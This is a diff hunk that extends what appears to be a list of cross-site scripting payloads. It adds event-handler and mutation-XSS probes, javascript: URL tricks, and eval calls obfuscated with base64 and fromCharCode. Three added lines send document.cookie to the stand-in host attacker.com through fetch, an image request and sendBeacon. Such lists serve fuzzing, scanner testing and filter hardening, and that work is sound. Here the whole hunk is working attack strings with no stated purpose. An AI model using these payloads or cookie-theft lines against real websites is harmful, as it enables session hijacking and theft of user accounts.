@@ -13,3 +13,23 @@
 <video><source src="data:text/html,<script>alert('XSS')</script>"></video>
 <svg><script>alert('XSS')</script></svg>
 <object data="data:text/html,<script>alert('XSS')</script>"></object>
+<img src=x oneonerrorrror=alert('XSS')>
+javascript:eval('alert("XSS")')
+<details open ontoggle=alert('XSS')>
+<select autofocus onfocus=alert('XSS')>
+<audio src onloadstart=alert('XSS')>
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert('XSS')&gt;">
+<noscript><p title="</noscript><img src=x onerror=alert('XSS')>">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<form><button formaction="javascript:alert('XSS')">
+<link rel="import" href="data:text/html,<script>alert('XSS')</script>">
+<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
+<script>new Image().src="http://attacker.com/"+document.cookie;</script>
+<script>navigator.sendBeacon('http://attacker.com', document.cookie)</script>
+<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
+<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
+<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert('XSS')"></xss>
+<brute contenteditable onblur=alert('XSS')>
+<form><input formaction="javascript:alert('XSS')">
